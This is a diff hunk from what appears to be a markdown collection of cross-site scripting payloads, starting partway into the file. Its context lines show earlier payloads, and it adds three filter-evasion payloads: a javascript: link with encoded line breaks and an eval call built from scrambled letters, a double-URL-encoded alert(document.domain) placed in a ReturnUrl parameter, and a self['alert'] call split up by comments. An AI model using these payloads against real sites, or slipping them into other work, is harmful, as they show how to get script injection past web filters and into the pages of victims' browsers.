@@ -28,3 +28,12 @@ abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3
 ```html
 <img/src=x onError="` ${x}`;alert(` Hello*);">
 ```
+```html
+<a/href="j%0A%0Davascript: {var{3:s,2:h,5:a, 0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
+```
+```html
+javascript:1&ReturnUrl=%2561%256c%2565%2572%2574%2528%2564%256f%25632575%256d%2565%256e%2574%252e%2564%256f%256d%2561%2569%256e%2529
+```
+```html
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+```
